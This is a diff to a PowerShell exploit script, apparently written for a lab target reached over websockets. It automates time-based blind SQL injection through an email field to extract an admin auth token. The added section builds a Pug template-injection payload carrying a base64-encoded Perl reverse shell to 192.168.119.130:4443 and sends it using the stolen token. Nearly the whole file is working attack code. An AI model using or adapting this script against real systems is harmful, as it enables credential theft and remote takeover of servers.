@@ -10,7 +10,6 @@ $login_str = "42[`"postLogin`",{`"email`":`"$usr_email`",`"password`":`"$pass`"}
 $save_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"id`":`"1`",`"token`":`"{0}`"}}]"
 $save_new_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"token`":`"{0}`"}}]"
 
-
 $check_email = "42[`"checkEmail`",{{`"token`":`"{0}`",`"email`":`"{1}`"}}]"
 # sqli within the email field
 $tag_email_str = "42[`"addTag`",{`"email`":`"{0}`",`"docid`":`"1`",`"token`":`"{1}`"}]"
@@ -96,7 +95,7 @@ function Get-StringLength {
     Write-Debug $guess
     $stopwatch = [System.Diagnostics.Stopwatch]::new()
     $stopwatch.Start()
-    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, -Debug
     $stopwatch.Stop()
     if($stopwatch.Elapsed.Seconds -ge 10) {
       Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
@@ -125,7 +124,7 @@ function Get-Count {
     Write-Debug $guess
     $stopwatch = [System.Diagnostics.Stopwatch]::new()
     $stopwatch.Start()
-    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
     $stopwatch.Stop()
     if($stopwatch.Elapsed.Seconds -ge 10) {
       Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
@@ -159,7 +158,7 @@ function Get-String {
       Write-Debug $guess
       $stopwatch = [System.Diagnostics.Stopwatch]::new()
       $stopwatch.Start()
-      Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+      Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
       #(Send-Message -Message $guess -SocketId 0).Msg
       #(Receive-Message -SocketId 0).Msg | Out-Null
       $stopwatch.Stop()
@@ -193,7 +192,7 @@ function Get-Query {
   Write-Debug $guess
   $stopwatch = [System.Diagnostics.Stopwatch]::new()
   $stopwatch.Start()
-  Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+  Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
   $stopwatch.Stop()
   if($stopwatch.Elapsed.Seconds -ge 10) {
     Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
@@ -204,15 +203,11 @@ function Get-Query {
 }
 
 $transport = {
-  param($msg, $SocketId, $debug)
-  if($debug) {
-    (Send-Message -Message $msg -SocketId $SocketId).Msg 
-    (Receive-Message -SocketId $SocketId).Msg
-  }
-  else {
-    (Send-Message -Message $msg -SocketId $SocketId).Msg | Out-Null
-    (Receive-Message -SocketId $SocketId).Msg | Out-Null
-  }
+  param($msg, $SocketId)
+  Send-Message -Message $msg -SocketId $SocketId | Out-Null
+  Receive-Message -SocketId $SocketId | Out-Null
+  #Write-Debug $sendv
+  #Write-Debug $recv
 }
 
 $getLength = {
@@ -282,4 +277,22 @@ Write-Output "AuthToken string length: $len"
 $admin_auth_token = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select token from AuthTokens where id = 1 limit 0,1" -Characterset $CharacterSets.printableChars -Length $len
 Write-Output "Admin Auth Token: $admin_auth_token"
 
+<#
+one method of remove code execution is by ssti.
+I got this payload from payload of all things: https://gist.githubusercontent.com/Jasemalsadi/2862619f21453e0a6ba2462f9613b49f/raw/e52a952130d102ef48b5146779249cceb3b5bf28/ssti_rev_shell_pug_node_js
+#>
+$ip='192.168.119.130'
+$port='4443'
+$b64_payload = "use Socket;`$i=`"$ip`";`$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(`"tcp`"));if(connect(S,sockaddr_in(`$p,inet_aton(`$i)))){open(STDIN,`">&S`");open(STDOUT,`">&S`");open(STDERR,`">&S`");exec(`"/bin/sh -i`");};"
+$b64_payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($b64_payload))
+$b64_payload
+$ssti_payload =@"
+42["updateSettings",{"homePage":"h1= title\r\np Welcome to #{title}\r\n\r\n#{7*7}\r\n\r\n#{spawn_sync = this.process.binding('spawn_sync')}\r\n#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}\r\n#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}\r\n#{payload='$b64_payload'}\r\n#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}\r\n","token":"$admin_auth_token"}]
+"@
+
+Send-Message -Message $ssti_payload -SocketId 0
+Receive-Message -SocketId 0
+Send-Message -Message '42["getHome"]' -SocketId 0
+#Receive-Message -Id 0
+#then visit the home page
 Remove-Module PoshWebSocketClient
